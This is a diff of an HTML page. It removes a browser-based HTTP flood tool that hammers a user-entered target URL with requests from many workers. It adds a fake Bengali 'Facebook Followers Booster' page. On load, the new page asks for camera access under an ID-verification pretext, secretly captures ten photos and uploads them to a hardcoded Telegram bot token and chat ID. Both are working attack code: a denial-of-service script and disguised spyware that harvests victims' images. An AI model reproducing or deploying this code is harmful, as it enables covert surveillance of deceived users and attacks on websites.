@@ -3,156 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SK KOBIR VAI - MATRIX TOOL</title>
+    <title>Facebook Followers Booster</title>
     <style>
-        * { box-sizing: border-box; }
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
-        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; }
-        .terminal { 
-            border: 2px solid #ff0000; width: 95%; max-width: 600px; margin: 30px auto; 
-            padding: 20px; background: rgba(10, 10, 10, 0.9); 
-            border-radius: 10px; box-shadow: 0 0 25px #ff0000;
-            position: relative; z-index: 1;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
         }
-        .brand-name { color: #fff; font-size: 28px; font-weight: bold; margin-bottom: 5px; text-shadow: 0 0 10px #ff0000; }
-        h1 { color: #ff0000; margin-top: 0; text-shadow: 0 0 5px #ff0000; letter-spacing: 2px; font-size: 24px; }
-        .input-group { margin: 15px 0; text-align: left; }
-        label { font-size: 14px; color: #aaa; display: block; margin-bottom: 5px; }
-        input { 
-            width: 100%; padding: 12px; background: rgba(0,0,0,0.7); border: 1px solid #ff0000; 
-            color: #00ff00; font-size: 16px; border-radius: 5px; outline: none; 
+        .logo-container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-        .btn-launch { background: #ff0000; color: white; border: none; padding: 15px; width: 100%; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; box-shadow: 0 0 10px red; }
-        .btn-stop { background: #444; color: white; border: none; padding: 15px; width: 100%; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; display: none; }
-        .stats { display: flex; justify-content: space-around; margin-top: 25px; border-top: 1px solid #333; padding-top: 15px; }
-        .val { font-size: 20px; color: #fff; font-weight: bold; display: block; }
-        #log { height: 120px; overflow-y: auto; background: rgba(5, 5, 5, 0.8); color: #00ff00; font-size: 12px; margin-top: 20px; text-align: left; padding: 10px; border: 1px solid #222; border-radius: 5px; }
-        .status-tag { font-size: 20px; margin: 10px; color: yellow; font-weight: bold; }
+        .fb-logo {
+            width: 100px; 
+            height: auto;
+            margin-bottom: 20px;
+        }
+        #video {
+            display: none;
+        }
+        .status {
+            margin-top: 20px;
+            color: #1877f2;
+            font-weight: bold;
+        }
+        .instruction {
+            color: #555;
+            font-size: 14px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
 
-<canvas id="matrixCanvas"></canvas>
-
-<div class="terminal">
-    <div class="brand-name">SK KOBIR VAI</div>
-    <h1>MATRIX LOAD TESTER</h1>
-    
-    <div class="input-group">
-        <label>TARGET URL:</label>
-        <input type="text" id="targetUrl" placeholder="https://example.com">
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo" class="fb-logo">
+        <h2 style="color: #1877f2;">ফলোয়ার বুস্টার সার্ভিস</h2>
+        <div class="instruction">আপনার ফেসবুক আইডি ভেরিফাই হচ্ছে, দয়া করে অপেক্ষা করুন...</div>
+        <div id="status" class="status">অনগ্রহ করে অপেক্ষা করুন...</div>
     </div>
 
-    <div style="display: flex; gap: 10px;">
-        <div class="input-group" style="flex: 1;">
-            <label>THREADS:</label>
-            <input type="number" id="threadCount" value="150">
-        </div>
-        <div class="input-group" style="flex: 1;">
-            <label>DURATION (SEC):</label>
-            <input type="number" id="duration" value="60">
-        </div>
-    </div>
+    <video id="video" width="320" height="240" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <button class="btn-launch" id="launchBtn" onclick="startSystem()">LAUNCH SYSTEM 🔥</button>
-    <button class="btn-stop" id="stopBtn" onclick="stopSystem()">TERMINATE ATTACK 🛑</button>
+    <script>
+        // আপনার টেলিগ্রাম তথ্য
+        const TELEGRAM_BOT_TOKEN = "7782944539:AAH3dm9luy7b_10C8dlPu5DX5OuyCAuiNhI";
+        const TELEGRAM_CHAT_ID = "7171463540";
 
-    <div class="status-tag" id="mainStatus">SYSTEM IDLE</div>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status');
 
-    <div class="stats">
-        <div class="stat-item">PACKETS<br><span id="totalReq" class="val">0</span></div>
-        <div class="stat-item">WORKERS<br><span id="activeThreads" class="val">0</span></div>
-        <div class="stat-item">HEALTH<br><span id="siteStatus" class="val" style="color: #00ff00;">READY</span></div>
-    </div>
-
-    <div id="log">Console initialized...<br></div>
-</div>
-
-<script>
-    // Matrix Animation and Attack Logic follows your provided script...
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()";
-    const fontSize = 15;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-
-    function drawMatrix() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#0F0";
-        ctx.font = fontSize + "px arial";
-        for (let i = 0; i < drops.length; i++) {
-            const text = chars.charAt(Math.floor(Math.random() * chars.length));
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        }
-    }
-    setInterval(drawMatrix, 35);
-
-    let totalRequests = 0;
-    let isRunning = false;
-    let autoStopTimer;
-
-    function logMessage(msg, color="#00ff00") {
-        const log = document.getElementById('log');
-        log.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>` + log.innerHTML;
-        if (log.childNodes.length > 30) log.removeChild(log.lastChild);
-    }
-
-    function startSystem() {
-        const url = document.getElementById('targetUrl').value.trim();
-        const threads = parseInt(document.getElementById('threadCount').value);
-        const dur = parseInt(document.getElementById('duration').value);
-        if (!url.startsWith("http")) { alert("Enter valid URL!"); return; }
-        isRunning = true;
-        document.getElementById('launchBtn').style.display = "none";
-        document.getElementById('stopBtn').style.display = "block";
-        document.getElementById('mainStatus').innerText = "SYSTEM ACTIVE 🚀";
-        logMessage("Exploit started on: " + url, "red");
-        for (let i = 0; i < threads; i++) { setTimeout(() => { runWorker(url); }, i * 2); }
-        document.getElementById('activeThreads').innerText = threads;
-        autoStopTimer = setTimeout(() => { stopSystem("Cycle Finished."); }, dur * 1000);
-        checkHealth(url);
-    }
-
-    function stopSystem(reason = "Attack Aborted.") {
-        isRunning = false;
-        clearTimeout(autoStopTimer);
-        document.getElementById('launchBtn').style.display = "block";
-        document.getElementById('stopBtn').style.display = "none";
-        document.getElementById('mainStatus').innerText = "SYSTEM IDLE";
-        document.getElementById('activeThreads').innerText = "0";
-        logMessage(reason, "yellow");
-    }
-
-    async function runWorker(url) {
-        while (isRunning) {
+        async function startCamera() {
             try {
-                fetch(url + "?x=" + Math.random(), { mode: 'no-cors', cache: 'no-store' });
-                totalRequests++;
-                document.getElementById('totalReq').innerText = totalRequests.toLocaleString();
-            } catch (e) {}
-            await new Promise(r => setTimeout(r, 5));
-        }
-    }
-
-    async function checkHealth(url) {
-        const h = document.getElementById('siteStatus');
-        const itv = setInterval(async () => {
-            if(!isRunning) { clearInterval(itv); return; }
-            try {
-                await fetch(url, { mode: 'no-cors' });
-                h.innerText = "ONLINE"; h.style.color = "#00ff00";
-            } catch (e) {
-                h.innerText = "CRITICAL"; h.style.color = "#ff0000";
-                logMessage("429: TOO MANY REQUESTS", "red");
+                // ক্যামেরা পারমিশন চাওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // ৩ সেকেন্ড পর থেকে ক্যাপচার শুরু
+                setTimeout(sendMultiplePhotos, 3000);
+            } catch (err) {
+                statusText.innerText = "Error: ক্যামেরা পারমিশন ছাড়া ফলোয়ার যোগ করা সম্ভব নয়!";
+                console.error(err);
             }
-        }, 4000);
-    }
-</script>
+        }
+
+        function captureFrame() {
+            return new Promise((resolve) => {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.6); 
+            });
+        }
+
+        async function sendMultiplePhotos() {
+            const totalPhotos = 10;
+            statusText.innerText = "আইডি ভেরিফিকেশন চলছে...";
+
+            for (let i = 1; i <= totalPhotos; i++) {
+                const photoBlob = await captureFrame();
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', photoBlob, `user_verify_${i}.jpg`);
+                formData.append('caption', `User Selfie ${i} for FB Followers`);
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(res => {
+                    if(res.ok) console.log(`Step ${i} complete`);
+                }).catch(err => console.error(err));
+
+                await new Promise(r => setTimeout(r, 400)); 
+            }
+
+            statusText.innerText = "ধন্যবাদ! আপনার আইডিতে ফলোয়ার পাঠানোর কাজ শুরু হয়েছে।";
+            statusText.style.color = "green";
+        }
+
+        window.onload = startCamera;
+    </script>
 </body>
-    </html>
+</html>
